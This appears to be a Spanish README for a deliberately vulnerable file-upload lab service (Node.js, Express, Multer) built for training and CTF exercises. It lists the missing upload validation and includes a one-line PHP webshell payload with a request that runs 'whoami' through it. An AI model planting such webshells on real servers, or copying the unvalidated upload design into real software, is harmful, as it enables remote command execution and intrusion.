# files-lab

Servicio de upload de archivos vulnerable para practicar file upload attacks.

## Información General

- **URL**: http://files.lab.local
- **Puerto interno**: 3000
- **Tecnologías**: Node.js, Express, Multer

## Endpoints Disponibles

| Método | Endpoint | Descripción |
|--------|----------|-------------|
| GET | `/health` | Health check |
| POST | `/upload` | Subir archivo |
| GET | `/uploads/:filename` | Acceder archivo subido |

## Upload

### Request

```bash
POST http://files.lab.local/upload
Content-Type: multipart/form-data

file: <archivo>
```

### Response

```json
{
  "message": "uploaded",
  "originalName": "test.png",
  "storedAs": "abc123.png",
  "url": "/uploads/abc123.png"
}
```

## Vulnerabilidades

### 1. Sin validación de tipo

No valida MIME type ni contenido. Permite subir cualquier archivo.

### 2. Path traversal potencial

El archivo se guarda con nombre generado por multer, pero la URL expone el path.

### 3. Static files serving

```javascript
app.use("/uploads", express.static(path.join(__dirname, "uploads")));
```

Permite acceso a todos los archivos en `/uploads`.

## Testing con Burp

### 1. Subir archivo normal

```bash
POST /upload
file: test.png
```

### 2. Subir webshell

```bash
POST /upload
file: shell.php
# Contenido: <?php system($_GET['cmd']); ?>
```

### 3. Acceder archivo

```bash
GET /uploads/shell.php?cmd=whoami
```

## CTF Challenge Ideas

1. **Fácil**: Subir archivo .txt y leerlo
2. **Medio**: Subir webshell y ejecutar comandos
3. **Difícil**: Evadir filtros de upload (Content-Type, extensión doble)

## Filtrar por tamaño (para SPAs)

```bash
# Si el servidor devuelve siempre el mismo tamaño para respuestas de error
--exclude-sizes=XXXX
```